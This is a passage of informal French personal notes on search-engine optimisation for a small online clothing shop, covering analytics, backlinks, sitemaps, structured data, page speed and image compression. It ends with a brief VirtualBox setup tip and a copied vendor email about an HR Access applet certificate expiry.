      Utiliser des liens internes (ancres), des boutons pour engager l'internaute à poursuivre visite sur d'autres pages: produits similaires, mêmes themes en fin de page...
      Rassurer l'internaute: toute de suite qui sommes nous ce qu'on fait, ce qu'on vend,notre tel pour nous joindre., appuyer sur les garanties: livraison gratuie, retours etc...; mettre en avant les avis clients;
      reduire le temps vitesse de chargement
      site responsive: pas de scroll horizontale quand reduction taille ecran
          https://www.google.com/webmasters/tools/mobile-friendly 
     3-  GoogleAnalytics a voir qq temps apres chaque modif>Audience>vueD'ensemble>TauxDeRebond/PagesParsession(doit etre >1) ou utilisateur. Taux de rebond est à priori negatif. MAis il faut surtout regarder l'evolution du taux de rebond que la moyenne/"utilisateurs". IL faudrait connaitre le taux de retour (= user va sur mon site puis part et va chez un concurent!) mais google le cache :-(
              Mon taux de retour doit être plus faible que la concurence
                      ma position = GooglePanda:interieurdemonsite/100*notireteExterieure
                      l'Interet, la Legitimite:    
                      temps passe sur la page
                      taux de retour à diminuer 
                      taux de rebond à diminuer
              Audience>Mobile>Vue d'ensemble;
                  regarder 'page/session' si la personne n'a vu qu'une page attention: pourquoi n'a t'elle vu q 'une page?
                  pareil pour Audience>Technologie>NavigateurOS puis choisir "resolution d'ecran"> ya t'il des ecrans à 100% en taux de rebond?
              Audience>centre d'interet(a activer! AFAIRE) Voir qui s'interesse à moi pour m'orienter
              Acquisition>tout le trafic>canaux // referal c a d vient d'un autre site qui à un lien vers moi : il faut que je m'applique à désavouer les liens en provenence de sites mals notés. car tout encre transmet sa valeur. attention impossible de revenir en arriere quand on disavow une ancre externe. Pour regarder les liens revant de l'exterieur : menu search trafics > backlinks. Je peux desavow tout un domain ou bien des URLs 
              Acquisition>tout le trafic>sites referents // d'ou ils sont venus
              Comportement>Contenu du site>Toutes les pages : // quelles pages sont les plus visitees voir la deuxième ligne
              Comportement>Contenu du site>Page de sortie  // attention si tout le monde sort de la page d'acceuil c tres mauvais   
      Retour à 1- en boucle.
  B) Notoriete & popularite : (google pingoin) 
      Liens d'autres sites (même FB) vers notre site mais NATURELS c a d interessants!!!+  qualite de ce qu'ils disent (plus l'origine est un gros site populaire, mieux c'est)
      attention google pingoin nous penalise si existe beaucoup de lien non naturels sans nofollow vers notre site.
      naturels = vraiment naturels. Pas force par moi (ex Sylvain Pham pas bon.), poste par moi, place SANS CONTREPARTIE hors articles editorial, dans une optique autre que celle du seo, pas de "partenaires". Dans des forums de discussion a condition que ca est a voir avec le theme du forum et du sujet
            faire des pubs/proposer un suport(widget,poster=infographie) à la radio, tv blogs mais ne pas leur demander de faire un lien. Les liens doivent se creer par eux memes. Ou Proposer un widget (copiercoller vers chez eux iframe fun)
            les proprietaires de blogs doivent avoir envie de me citer par eux meme: proposer d'etre interviewe pour un blog (avec creation du lien par eux spontanement)
            faire une interview/sondage de eux chez nous-creer->widget, infographie  (steevejobs: mignon)
          <a rel="nofollow" pour que google ne prenne pas en compte ce lien et ne me penalise pas dessus. Les liens non naturels doivent être en nofollow. Je peux en avoir beaucoup mais doivent etre nofollow  (exemple: mon panier, mon compte doivent etre en nofollow)
          Je peux regarder sur googlewebmastertools a la main ( trafic de recherche>analyse de la recherche>liens vers votre site) mais je peux aussi:
          linkresearchtools.com // tres bien mais payant A FAIRE! verifier dessus avant de supprimer lien CEMPER Trust = combien le juge a confiance dans notre site; CEMPER Power= nombre de liens. mais pour googlepingoin la qualite est plus importante que la quantite
          ahrefs.com // important regarder refering domains // aaahh il faut payer tout de suite
          Si je supprime des liens non naturels il FAUT que je regagne des liens naturels
        Reseaux sociaux:
          se comparer à la concurrence: il faut etre cite sur fb etc... par plusieurs personnes c tres bon. Attention si personne ne nous cite mais ya bcp de likes et grand popularite: google puni
          A Faire: tweetymail.com > etre notifie quand un tweet interessant pour nous est poste: on peut alors interagir avec le tweet et echanger (sans faire de pub)
                   facebook et google+ meme chose: faut participer, communiquer aux conversations!>constituer un reseau petit a petit en y passant du temps raisonable. POur ces deux il faut surtout que les personnes likent notre SITE (pas notre page) A FAIRE: mettre bouton facebook et google+ sur notre site bien en evidence. Ne surtout pas acheter de fans!
           faire un tableau
            activite | sous activités variantes | ciblage geographique | ciblage date 
            c a d    |                          |                      |
            categorie|                          |                      |
            ---------|--------------------------|----------------------|-------------
            pret à   |vetements bio exportation | international        |ventes privées...
            porter   |vetements bébés           |                      |
            bio;     |zero teinture             |                      |
            vetements|                          |                      |
            bio      |                          |                      |
            nb:30     nb:8 environ -> on croise toutes les possibilités =400 mots cles et on doit retrouver ces termes dans les titles, h1, h2...h6 et les ancres.. du site web. definition ancre: lien interne l'ancre c'est le texte du <a href="...">ici</a> 
  Aspects techniques:  
    un site ne doit PAS être indisponible plus de 24h sinon google puni.(donc attention lors migration serveur) et si je change de serveur il faut que ce soit plus rapide qu'avant sinon google puni cas inverse: recompense
    sitemap : // c pas un fichier très important pour le referencement!
        facultatif : utiliser que quand ya bcp de pages; quand le site varie très souvent; le site est lie à google actualite; sinon pas la peine.
         robot.txt fait reference à sitemap.xml (attention les commentaires dans robot.txt sont quand meme analysés)
          soit je le met dans googlemastertools mais alors c que pour google
          soit je le met dans robot.txt: mettre à la dernière ligne: 
              Sitemap: http://monurl/sitemap.xml
                    et ce sitemap contient: 
                      <sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                        <sitemap>
                          <loc>urld'unsitemapDoitAvoir50 000 urls max</loc>
                        </sitemap>
                        <sitemap>
                          <loc>urld'unAutreSitemap</loc>
                        </sitemap>...
    attribut de balise html "itemprop" à choisir sur schema.org pour que google comprenne mon site
          exemple:
               <div id="crossselling_list" itemscope itemtype="http://schema.org/Product"> // itemscope pour dire de regarder mes itemxxx; itemtype: type d'objet
                <meta itemprop="name" content="Slow Fashion collection" /> // itemprop: attribut de l'objet itemtype PARENT(toujours) (ici je met meta car je veux pas afficher en html cette valeur)
                  {foreach from=$orderProducts item='orderProduct' name=orderProduct}
                      <div style="display:inline-block" itemprop="isRelatedTo" itemscope itemtype="http://schema.org/Product"> // isRelatedTo ca concerne le PARENT
    balises meta les plus importantes dans <header>: <title> et <meta name="description" content ="..."> Attention chaque page (surtout les pages categories) doit avoir un title (65 char max) different et un meta description different. IL FAUT mettre une description pour chaque page sinon google choisi n'imp et l'utilisateur ne cliquera pas. Ne SURTOUT PAS copier du contenu d'un autre site. SI j'ai des doublons de meta sur mon propre site utiliser : <link rel="canonical" href="https://titito" />// ca veut dire cette page est un double de titito et titito est la reference à privilegier
                    <h1> et <h2> aussi sont tres importants
    les images img: utiliser alt pour dire à google ce que c'est (alternatif: affiche le texte si image pas pu charger). Les fichiers images eux aussi doivent avoir un nom bien qui décrit bien ce qu'ils sont. nomImage=identification et alt =description
    https://www.youtube.com/watch?v=B9x3IkU8eaw&t=35s
    pour tester les liens casses 404: 
        home.snafu.de/tilman/xenulink.html
        c normal d'avoir des pages 404: ce qu'il faut faire c'est dire au client que "le prdt n'existe plus" puis proposer dans la même page d'autres produits à la place// pour garder l'internaute et l'empecher à retrourner sur google
    voir robots.txt
    vitesse : pas plus de 2 voire 1 seconde Mobile ET Desktop. Il faudrait idealement 0.5sec max. De plus le googlebot viendra plus frequement si c rapide
        https://developers.google.com/speed/pagespeed/insights/?hl=fr&url=https%3A%2F%2Fwww.wenhuaduverge.com%2Fshop%2Ffr%2Fcontent%2F2-wenhua-duverge-s-world
        gtmetrix.com
              attention les deux notent les efforts fourni pour la vitesse. Pas la vitesse reellement. (regarder "full loaded time" à comparer avec celui de mes concurrents) Voir les conseils.
                    pour savoir si mon serveur est lent temps de reponse du serveur à analyser avec TTFB(time to first byte: temps entre envoit requete et premier byte recu du serveur)
        si dans plusieurs pays: mettre plusieurs serveurs avec même nom de domaine selon pays: voir CDNs
        Faire de la compression Gzip du serveur A FAIRE!             
        compression d'images optimisation img sans perte de qualite:
          http://advsys.net/ken/utils.htm voir dans D:/DEV/pngout.exe // a executer en ligne de commande sur windows: pngout.exe Lot4devFrontEND.PNG Lot4devFrontENDOUT.png
          http://freecode.com/projects/jpegoptim    D:/Dev/jpegoptim-1.3.0-win32-binary/jpegoptim.exe d:/Profiles/lduverge/Ah02hight.jpg ATTENTION je crois qu'il ecrase l'ancien fichier
                                                    F:\Mesdocuments\Installations\jpegoptim-1.3.0-win32-binary/jpegoptim.exe F:/PHOTOS/aeffacer/*.jpg
    mettre dans .htaccess pour que http redirige vers https quand on clique sur un lien http vers notre site depuis l'exterieur.
    googlewebmastertools: passer tout ça en revue: Sert à faire des verifs mais ne fait rien par rapport à la popularite, legitimite etc...
                                apparence dans les resultats de redcherche 
                                           donnees structurees
                                           ameliorations html
                                 trafic de recherche
                                            analyse de la recherche
                                            liens vers votre site
                                            actions manuelles: si google ma penalise manuellement
                                            ciblage international
                                            ergonomie mobile
                                  index google
                                            etat de l'indexation // nb depage que je connais
                                  explorations // est ce que google arrive a bien explorer mon site
                                            statistiques sur l'exploration // plus google passe sur mon site , mieux c'est
                                            explorer comme google
                                            outil de test du fichier robots.txt
                                            Sitemaps
                                    problemes de securite
                              
    voir chargement asynchrone de css: 
      <link rel="stylesheet" href="css.css" media="none" onload="if(media!='all')media='all'">
      <noscript><link rel="stylesheet" href="css.css"></noscript>      
   pour  voir si mes balises sont comprises par google:
      https://search.google.com/structured-data/testing-tool/ (le menu manual actions doit etre vide)
      a faire dessus: dans prefered domain mettre "www.wenhuaduverge.com" et aussi "wenhuaduverge.com"
      tres important de lire les messages de la search console.
  si je change mon site et que des pages ont leur contenu migre dans un autre page : voir LINK*.33..3 //très important pour conserver son referencement car si une page d'avant qui existait envoi un 404 c'est très mauvais pour google
  si je change de nom de domaine [A EVITER](parce que google nous a puni gravement) ou parce que changement de marque: prevenir google de ce changement sinon rank est perdu:webmastertools>engrenage>changementd'adresse
      toujours conserver un temps l'ancien nom de domaine pour rediriger redirection 301 les utilisateurs perdus
        >>>atteindre un rank de 4/10 c'est déjà top
virtualbox : virtuabox :virtual box : virtual machine
    les .iso sont sur les sites ubuntu,debian... etc...
  lancer vbox> nouveau> creer un disque dur virtuel now > creer > config > stockage > ide > choisir un fichier .iso super important de faire ca avant pour toute installation de vm sinon la vm n'a pas de reseau      
HRACCESS 7.30 certificat 
      Ce mail pour vous informer qu’un nouvel article a été publié sur le site du Support Clients HR Access dans la section « Aide au diagnostic et Maintenance Préventive ».
      Il fait suite aux problèmes remontés par certains des clients en 7.30.x suite à l’expiration du certificat des applets java.
      Vous trouverez les détails dans l’article dont voici le lien :
      http://www.support.hraccess.com/support/news.nsf/($All)/9172652B3D70567AC12581D400487E2B?OpenDocument
      Merci de transmettre le message à vos équipes.
      Nous sommes en train de livrer les correctifs (nouvelle signature des applets) aux clients qui nous ont signalé l’anomalie.
      Pour toute question complémentaire, vous pouvez vous adressez à Cécile Villevieille  
